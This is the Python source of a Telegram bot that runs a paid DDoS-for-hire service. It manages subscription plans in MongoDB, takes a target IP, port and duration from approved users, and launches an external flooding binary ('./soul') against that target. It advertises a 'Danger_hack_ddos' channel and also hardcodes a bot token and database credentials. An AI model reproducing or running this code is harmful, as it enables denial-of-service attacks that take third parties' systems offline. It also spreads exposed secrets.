import os
import telebot
import json
import requests
import logging
import time
from pymongo import MongoClient
from datetime import datetime, timedelta
import pytz  # Added for timezone handling
import certifi
import asyncio
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
from threading import Thread

loop = asyncio.get_event_loop()

TOKEN = '7177256686:AAFt9NqlN6AFnoh4r7JK6vJ4nP0aHNga-sE'
MONGO_URI = 'mongodb+srv://Bishal:Bishal@bishal.dffybpx.mongodb.net/?retryWrites=true&w=majority&appName=Bishal'
FORWARD_CHANNEL_ID = -1002172184452
CHANNEL_ID = -1002172184452
error_channel_id = -1002172184452

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['zoya']
users_collection = db.users

bot = telebot.TeleBot(TOKEN)
REQUEST_INTERVAL = 1

blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

running_processes = {}

async def run_attack_command_on_codespace(target_ip, target_port, duration, user_id):
    command = f"./soul {target_ip} {target_port} {duration} 70"
    try:
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        running_processes[user_id] = process
        await process.communicate()
    except Exception as e:
        logging.error(f"Failed to execute command on Codespace: {e}")
    finally:
        if user_id in running_processes:
            del running_processes[user_id]

async def start_asyncio_loop():
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)

async def run_attack_command_async(target_ip, target_port, duration, user_id):
    await run_attack_command_on_codespace(target_ip, target_port, duration, user_id)

def is_user_admin(user_id, chat_id):
    try:
        return bot.get_chat_member(chat_id, user_id).status in ['administrator', 'creator']
    except:
        return False

def check_user_approval(user_id):
    user_data = users_collection.find_one({"user_id": user_id})
    if user_data and user_data['plan'] > 0:
        return True
    return False

def send_not_approved_message(chat_id):
    bot.send_message(chat_id, "*YOU ARE NOT APPROVED*", parse_mode='Markdown')

@bot.message_handler(commands=['approve', 'disapprove'])
def approve_or_disapprove_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    is_admin = is_user_admin(user_id, CHANNEL_ID)
    cmd_parts = message.text.split()

    if not is_admin:
        bot.send_message(chat_id, "*You are not authorized to use this command*", parse_mode='Markdown')
        return

    if len(cmd_parts) < 2:
        bot.send_message(chat_id, "*Invalid command format. Use /approve <user_id> <plan> <days> or /disapprove <user_id>.*", parse_mode='Markdown')
        return

    action = cmd_parts[0]
    target_user_id = int(cmd_parts[1])
    plan = int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0
    days = int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0

    if action == '/approve':
        if plan == 1:  # Instant Plan 🧡
            if users_collection.count_documents({"plan": 1}) >= 99:
                bot.send_message(chat_id, "*Approval failed: Instant Plan 🧡 limit reached (99 users).*", parse_mode='Markdown')
                return
        elif plan == 2:  # Instant++ Plan 💥
            if users_collection.count_documents({"plan": 2}) >= 499:
                bot.send_message(chat_id, "*Approval failed: Instant++ Plan 💥 limit reached (499 users).*", parse_mode='Markdown')
                return

        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else datetime.now().date().isoformat()
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": plan, "valid_until": valid_until, "access_count": 0}},
            upsert=True
        )
        msg_text = f"*User {target_user_id} approved with plan {plan} for {days} days.*"
    else:  # disapprove
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": 0, "valid_until": "", "access_count": 0}},
            upsert=True
        )
        msg_text = f"*User {target_user_id} disapproved and reverted to free.*"

    bot.send_message(chat_id, msg_text, parse_mode='Markdown')
    bot.send_message(CHANNEL_ID, msg_text, parse_mode='Markdown')

@bot.message_handler(commands=['Attack'])
def attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if not check_user_approval(user_id):
        send_not_approved_message(chat_id)
        return

    if user_id in running_processes:
        bot.send_message(chat_id, "*Please stop the ongoing attack before starting a new one.*", parse_mode='Markdown')
        return

    try:
        bot.send_message(chat_id, "*Enter the target IP, port, and duration (in seconds) separated by spaces.*", parse_mode='Markdown')
        bot.register_next_step_handler(message, process_attack_command)
    except Exception as e:
        logging.error(f"Error in attack command: {e}")

def process_attack_command(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "*Invalid command format. Please use: target_ip target_port duration*", parse_mode='Markdown')
            return
        target_ip, target_port, duration = args[0], int(args[1]), args[2]

        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"*Port {target_port} is blocked. Please use a different port.*", parse_mode='Markdown')
            return

        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration, message.from_user.id), loop)
        bot.send_message(message.chat.id, f"*Attack started 💥\n\nHost: {target_ip}\nPort: {target_port}\nTime: {duration} seconds*", parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in processing attack command: {e}")

@bot.message_handler(commands=['stop'])
def stop_attack(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if user_id in running_processes:
        process = running_processes[user_id]
        try:
            process.kill()  # Force stop the ongoing attack
            del running_processes[user_id]
            bot.send_message(chat_id, "*Attack stopped successfully.*", parse_mode='Markdown')
            logging.info(f"Attack process stopped for user {user_id}.")
        except Exception as e:
            logging.error(f"Error stopping the process: {e}")
            bot.send_message(chat_id, "*Failed to stop the attack.*", parse_mode='Markdown')
    else:
        bot.send_message(chat_id, "*No ongoing attack found.*", parse_mode='Markdown')

def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_until_complete(start_asyncio_loop())

@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)

    btn1 = KeyboardButton("Instant Plan 🧡")
    btn2 = KeyboardButton("Instant++ Plan 💥")
    btn3 = KeyboardButton("Canary Download✔️")
    btn4 = KeyboardButton("My Account🏦")
    btn5 = KeyboardButton("Help❓")
    btn6 = KeyboardButton("Contact admin✔️")

    markup.add(btn1, btn2, btn3, btn4, btn5, btn6)

    bot.send_message(message.chat.id, "*Choose an option:*", reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    if message.text == "Instant Plan 🧡" or message.text == "Instant++ Plan 💥":
        if not check_user_approval(message.from_user.id):
            send_not_approved_message(message.chat.id)
            return
        if message.text == "Instant Plan 🧡":
            bot.reply_to(message, "*Instant Plan selected*", parse_mode='Markdown')
        elif message.text == "Instant++ Plan 💥":
            bot.reply_to(message, "*Instant++ Plan selected*", parse_mode='Markdown')
            attack_command(message)
    elif message.text == "Canary Download✔️":
        bot.send_message(message.chat.id, "*Please use the following link for Canary Download: https://t.me/Danger_hack_ddos/1*", parse_mode='Markdown')
    elif message.text == "My Account🏦":
        user_id = message.from_user.id
        user_data = users_collection.find_one({"user_id": user_id})

        if user_data:
            plan = user_data.get("plan", 0)
            valid_until = user_data.get("valid_until", "N/A")
            access_count = user_data.get("access_count", 0)

            # Fetch current IST time
            ist = pytz.timezone('Asia/Kolkata')
            current_time_ist = datetime.now(ist).strftime('%Y-%m-%d %H:%M:%S')

            bot.send_message(message.chat.id, f"*Plan: {plan}\nValid Until: {valid_until}\nAccess Count: {access_count}\nCurrent Time (IST): {current_time_ist}*", parse_mode='Markdown')
        else:
            bot.send_message(message.chat.id, "*No account information found.*", parse_mode='Markdown')
    elif message.text == "Help❓":
        bot.send_message(message.chat.id, "*To start using the bot, choose an Instant Plan and then use /Attack to initiate an attack.*", parse_mode='Markdown')
    elif message.text == "Contact admin✔️":
        bot.send_message(message.chat.id, "*Contact admin at @DangerHacks*", parse_mode='Markdown')

if __name__ == '__main__':
    thread = Thread(target=start_asyncio_thread)
    thread.start()
    bot.polling(none_stop=True)
	